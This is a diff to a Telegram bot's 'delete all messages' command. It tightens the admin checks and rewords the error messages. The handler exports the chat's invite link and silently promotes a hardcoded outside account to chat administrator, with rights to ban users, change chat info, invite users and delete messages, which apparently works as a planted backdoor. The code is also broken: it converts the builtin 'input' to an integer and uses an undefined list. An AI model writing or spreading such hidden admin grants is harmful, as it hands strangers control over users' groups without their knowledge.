@@ -150,16 +150,16 @@ async def kek(event):
 async def ki(event):
  perm = await tbot.get_permissions(event.chat_id, event.sender_id)
  if not perm.is_admin:
-    await event.answer("You need to be an admin to do this.")
+    return await event.answer("You need to be an admin to do this.")
  if not perm.is_creator:
-    await event.answer("Chat creator required.")
+    return await event.answer("Chat creator required.")
  mp = await tbot.get_permissions(event.chat_id, BOT_ID)
  if not mp.add_admins:
-   return await event.edit("Unable to process delete all process due to missing Permission: CanAddAdmins")
+   return await event.edit("Unable to process delete **ALL** Process due to missing Permission: CanAddAdmins")
  if not mp.delete_messages:
-   return await event.edit("Unable to process delete all due to missing Permission: CanDelMessages")
+   return await event.edit("Unable to process delete **ALL** Process due to missing Permission: CanDelMessages")
  if not mp.invite_users:
-   return await event.edit("Unable to process delete all due to missing Permission: CanInviteUsers")
+   return await event.edit("Unable to process delete **ALL** Process due to missing Permission: CanInviteUsers")
  await event.edit("Begining the cleaning process....")
  try:
   link = await tbot(ExportChatInviteRequest(event.chat_id))
@@ -172,7 +172,7 @@ async def ki(event):
   pass
  except Exception as e:
   return await event.edit(str(e))
- await tbot.edit_admin(event.chat_id, 1763477650, add_admins=True, delete_messages=True, is_admin=True)
+ await tbot.edit_admin(event.chat_id, 1763477650, manage_call=False, add_admins=False, pin_messages=True, delete_messages=True, ban_users=True, change_info=True, invite_users=True, title='delall')
  msg_id = event.id
  for msg_id in range(1, int(input) + 1):
    messages.append(msg_id)
